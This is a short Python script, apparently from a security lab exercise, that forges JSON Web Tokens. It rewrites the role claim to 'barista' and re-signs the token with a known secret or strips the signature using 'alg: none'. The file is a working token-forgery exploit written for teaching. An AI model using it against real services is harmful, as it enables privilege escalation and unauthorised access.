#!/usr/bin/env python3
"""Make a new JWT from an old one, with "role": "barista" (Lab 6).

  python3 forge.py TOKEN SECRET     signed with SECRET (HS256)
  python3 forge.py TOKEN --none     "alg": "none", no signature

The new payload goes to the screen (stderr); the new token alone goes to
stdout, so that FORGED=$(python3 forge.py ...) keeps only the token.
"""

import json
import sys

from orders import b64, make_token, unb64


def main():
    if len(sys.argv) != 3:
        sys.exit("usage: python3 forge.py TOKEN SECRET")
    try:
        claims = json.loads(unb64(sys.argv[1].split(".")[1]))
    except (IndexError, ValueError):
        sys.exit("This is not a JWT: it needs three parts, with two dots.")
    claims["role"] = "barista"
    print("New payload: " + json.dumps(claims), file=sys.stderr)
    if sys.argv[2] == "--none":
        head = b64(json.dumps({"alg": "none", "typ": "JWT"}).encode())
        print(head + "." + b64(json.dumps(claims).encode()) + ".")
    else:
        print(make_token(claims, sys.argv[2]))


if __name__ == "__main__":
    main()
